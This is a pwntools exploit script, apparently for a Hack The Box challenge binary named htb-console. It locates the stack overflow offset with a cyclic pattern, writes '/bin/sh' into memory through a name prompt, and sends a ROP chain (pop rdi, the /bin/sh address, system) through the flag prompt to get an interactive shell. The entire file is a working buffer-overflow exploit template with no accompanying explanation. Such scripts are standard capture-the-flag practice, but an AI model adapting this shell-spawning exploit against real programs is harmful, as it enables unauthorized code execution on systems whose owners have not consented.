from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>>', 'flag')
    p.sendlineafter('Enter flag:', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './htb-console'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Can find these addresses in Radare, Ghidra, IDA, GDB etc..
# Or, can find them via pwntools e.g. elf.symbols['system']
system_addr = elf.symbols.system  # 0x401040  # From the 'date' function call
binsh_addr = 0x4040b0  # We write this string using HoF
# Need this to pass /bin/sh as parameter (x64 calling convention)
# Could also find this using ROP object in pwntools ;)
pop_rdi = 0x401473  # pop rdi; ret;

# We want to inject /bin/sh string using HoF option
io.sendlineafter('>>', 'hof')
io.sendlineafter('Enter your name:', '/bin/sh')

# Build the payload
payload = flat(
    {offset: [
        pop_rdi,  # Pop the following address to RDI
        binsh_addr,  # /bin/sh string we wrote using HoF
        system_addr  # system function
    ]}
)

# Send our payload
io.sendlineafter('>>', 'flag')
io.sendlineafter('Enter flag:', payload)

# Got shell?
io.interactive()
